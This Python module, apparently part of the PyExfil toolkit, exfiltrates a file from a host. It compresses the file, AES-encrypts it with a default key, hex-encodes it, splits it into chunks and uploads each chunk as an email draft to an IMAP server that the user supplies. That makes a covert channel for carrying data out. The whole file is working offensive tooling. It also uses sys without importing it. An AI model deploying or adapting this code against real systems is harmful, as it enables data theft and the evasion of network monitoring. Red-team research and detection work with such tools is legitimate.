#!/usr/bin/env python3

import ssl
import time
import zlib
import imaplib
import binascii
import email.message
import email.charset

from pyexfil.includes.prepare import PrepFile
from pyexfil.includes.exceptions import FileDoesNotExist
from pyexfil.includes.general import _split_every_n, does_file_exist
from pyexfil.includes.encryption_wrappers import PYEXFIL_DEFAULT_PASSWORD
from pyexfil.includes.encryption_wrappers import AESDecryptOFB, AESEncryptOFB


# Settings
TIMEOUT             = 0.1
PACKET_MAX_SIZE     = 8192


def _send_packet(host, creds, i, data):

    # Connect to server
    try:
        tls_context = ssl.create_default_context()
        server = imaplib.IMAP4(host)
        server.starttls(ssl_context=tls_context)
        server.login(creds[0], creds[1])
        server.select("INBOX.Drafts")
    except Exception as e:
        print("Error connecting to server '%s': '%s'." % (host, str(e)))
        return False

    # Create Message
    new_message = email.message.Message()
    new_message["From"] = "Long Term Storage <PyExfil@MoriRT>"
    new_message["To"] = "Return <return+here@MoriRT>"
    new_message["Subject"] = "Package %s" % i
    new_message.set_payload(data)

    # ASCII UTF Encoding magic foo
    new_message.set_charset(email.charset.Charset("utf-8"))
    encoded_message = str(new_message).encode("utf-8")
    server.append('INBOX.Drafts', '', imaplib.Time2Internaldate(time.time()), encoded_message)

    server.close()
    return True


class Send:
    def __init__(self, file_path, server_addr, server_creds, key=PYEXFIL_DEFAULT_PASSWORD):
        if not does_file_exist(file_path):
            FileDoesNotExist(file_path)
        self.file_path      = file_path
        self.server_addr    = server_addr
        self.server_creds   = server_creds
        self.key            = key
        self.data           = None

        self._load_data()

    def _load_data(self):
        self.data = ""
        try:
            f = open(self.file_path, 'rb')
            data = f.read()
            f.close()
        except Exception as e:
            sys.stderr.write("Could not read file.\n")
            sys.stderr.write("Error: %s.\n" % e )
            sys.exit(1)
            return False

        self.data = data
        return True

    def Exfiltrate(self):
        data            = zlib.compress(self.data)
        data            = AESEncryptOFB(text=data, key=self.key)
        data_as_hex     = str(binascii.hexlify(data))[2:-1]
        exfiltrate_this = _split_every_n(data_as_hex, PACKET_MAX_SIZE)

        i = 0
        for item in exfiltrate_this:
            i += 1
            check = _send_packet(self.server_addr, self.server_creds, i, item)
            if not check:
                return False

        return True


class Broker:
    def __init__(self):
        sys.stdout.write("No Broker method is implemented for this module.\n")
        sys.stdout.write("Just use the files sent and decode and decompress them.\n")


if __name__ == "__main__":
    sys.stdout.write("I am a module, Jim, not a doctor!\n")
    sys.exit(0)
